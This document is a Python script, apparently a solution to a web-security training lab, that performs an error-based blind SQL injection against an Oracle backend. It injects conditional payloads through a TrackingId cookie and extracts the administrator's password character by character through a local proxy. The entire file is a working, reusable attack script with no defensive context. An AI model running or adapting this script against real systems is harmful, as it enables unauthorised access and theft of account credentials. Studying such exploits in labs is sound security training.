import sys
import requests
import urllib3
import urllib



urllib3.disable_warnings()
proxies = {'http': 'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' AND (SELECT CASE WHEN ((SELECT ascii(SUBSTR(password,%s,1)) FROM users WHERE username='administrator')='%s') THEN 'a' ELSE TO_CHAR(1/0)  END FROM dual)='a" % (i, j)

            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': '4dLOt64ZwbOlQCc' + sqli_payload_encoded, 'session': 'ZM3cO90SFyEe1qwdbCPehR9Eh6rWukPM'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if 'Lifestyle' not in r.text:
                sys.stdout.write('\r'+ password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r'+ password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)
if __name__ == "__main__":
    main()
